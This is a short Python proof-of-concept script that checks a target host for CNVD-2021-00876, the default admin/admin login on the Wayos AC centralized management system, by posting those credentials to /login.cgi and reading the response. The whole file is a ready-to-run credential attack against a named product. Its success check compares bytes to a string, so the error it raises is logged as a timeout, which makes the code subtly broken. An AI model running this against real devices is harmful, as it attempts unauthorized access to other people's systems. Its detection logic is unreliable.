#encoding:utf-8
try:
    import requests,os,sys,logging
    logging.basicConfig(level=logging.INFO,format="%(message)s")
except Exception as e:
    logging.info("[*] {}".format(e))
    os._exit(6)

def check(ip,port):
    target = "http://" + ip + ":" + port
    payload = "/login.cgi"                                   #填写payload
    header = {
        "Content-Type": "application/x-www-form-urlencoded"
    }                                                               #填写header头
    data = "user=admin&password=admin"                                               #填写data数据
    try:
        req = requests.post(url=target+payload,headers=header,data=data,timeout=3,verify=False,allow_redirects=False)

        if req.status_code == 200:
            if (b'flag=0' in req.text):              #填写判断条件
                logging.info("[+] {} find Wayos_AC集中管理系统默认弱口令_CNVD-2021-00876".format(ip))                          #填写漏洞名
                os._exit(1)

        logging.info("[-] {} do not found Wayos_AC集中管理系统默认弱口令_CNVD-2021-00876".format(ip))                          #填写漏洞名
        os._exit(2)
    except Exception as e:
        logging.info("[*] timeout")
        os._exit(4)

if __name__== "__main__":
    ip = sys.argv[1]
    port = sys.argv[2]
    check(ip,port)